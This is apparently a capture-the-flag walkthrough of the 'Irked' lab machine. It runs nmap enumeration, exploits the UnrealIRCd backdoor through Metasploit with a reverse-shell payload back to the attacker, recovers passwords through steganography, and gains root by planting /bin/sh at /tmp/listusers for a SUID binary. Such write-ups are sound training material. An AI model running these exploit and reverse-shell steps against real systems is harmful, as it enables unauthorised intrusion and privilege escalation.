## Enumeration

We start by running nmap to see what ports are on on the target machine 
```bash
nmap -sV -sC -p- 10.10.10.117
```
`-sV` enables version detection.
`-sC` runs default scripts
`-p-` to scan all ports.
Output:
```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
60833/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
```

## Observations & Exploit

Exploiting UnrealIRCd Backdoor
Use Metasploit or manual reverse shell over the UnrealIRCd backdoor:
```
msfconsole
search UnrealIRCd 
select 0
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 10.10.10.117
set RPORT 65534
set payload cmd/unix/reverse
set LHOST <tun0 IP>
set LPORT 4444
run
```
Shell as `ircd`

It lists all files under `/home/djmardov` with details, ignoring errors.
```
find /home/djmardov -type f -exec ls -la {} \; 2>/dev/null
-rw-r--r-- 1 djmardov djmardov 675 May 11  2018 /home/djmardov/.profile
-rw-r--r-- 1 djmardov djmardov 52 May 16  2018 /home/djmardov/Documents/.backup
-rw------- 1 djmardov djmardov 4706 Nov  3  2018 /home/djmardov/.ICEauthority
-rw-r--r-- 1 djmardov djmardov 220 May 11  2018 /home/djmardov/.bash_logout
-rw-r--r-- 1 djmardov djmardov 3515 May 11  2018 /home/djmardov/.bashrc
-rw-r----- 1 root djmardov 33 Apr 17 21:38 /home/djmardov/user.txt
ircd@irked:~/Unreal3.2$ ls -la /home/djmardov
```
Lets check the .backup
```
/home/djmardov/Documents/.backup
cat /home/djmardov/Documents/.backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

If we try to log in to djmardov with this password, we are not allowed to do that :(
But there was an image on the from page, lets have a look at that.
```
wget http://10.10.10.117/irked.jpg
```

It extracts hidden data from `irked.jpg` using steghide.
```
steghide extract -sf irked.jpg
# Password: UPupDOWNdownLRlrBAbaSSss

Kab6h+m+bbp2J:HG
```

Now back in our shell ``
```
su djmardov
# Password: Kab6h+m+bbp2J:HG

cat ~/user.txt
88780f4a6407365*****************
```

##  Privileges Escalation

Check for SUID binaries:
```
find / -perm -4000 -type f 2>/dev/null
...
/usr/bin/viewuser
...
```
If we run that 
```
/usr/bin/viewuser
sh: 1: /tmp/listusers: not found
```
This means it tries to run `/tmp/listusers` **as root**.
Create malicious script:
```
echo "/bin/sh" > /tmp/listusers
chmod +x /tmp/listusers
```
Run the SUID binary:
```
/usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2025-04-17 21:38 (:0)
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
pass.txt  root.txt
# cat root.txt
cat root.txt
feff7c74c72c03a*****************
```
## What’s the Privilege Escalation?

Once you get access as the user `djmardov`, you notice there’s a strange binary on the system called `viewuser`. It’s not something you'd normally find on a Linux box, which makes it suspicious right away.
The key thing about this binary is that it has the SetUID permission set which means whenever it is executed, it runs as root, regardless of which user launches it. That alone isn’t necessarily dangerous — many legitimate system programs use SetUID but when a custom binary does this, it often opens the door to privilege escalation.
When you run the binary, it prints a vague message about being in development and then shows an error: it tries to run a file called `/tmp/listusers`, but that file doesn’t exist.
This is the actual vulnerability.

The binary is written in a way that it tries to execute the `/tmp/listusers` script without checking its contents or permissions and since the binary is running as root, anything it executes also runs as root.
If the binary were coded securely, it would never blindly run something from a writable location like `/tmp`. But in this case, it does and it gives any user on the system the opportunity to place a malicious file at `/tmp/listusers`.
This is a classic example of insecure use of external scripts in a privileged context.

Because `/tmp` is writable by any user, you as `djmardov` can simply create a file named `/tmp/listusers` and make it executable. Inside that file, you place a command that spawns a root shell. Then you run the vulnerable binary.
Since the binary is SetUID and runs as root and it's designed to run `/tmp/listusers` — your malicious script gets executed with full root privileges.
This instantly gives you a root shell, and you can now access `root.txt` or do anything else on the box.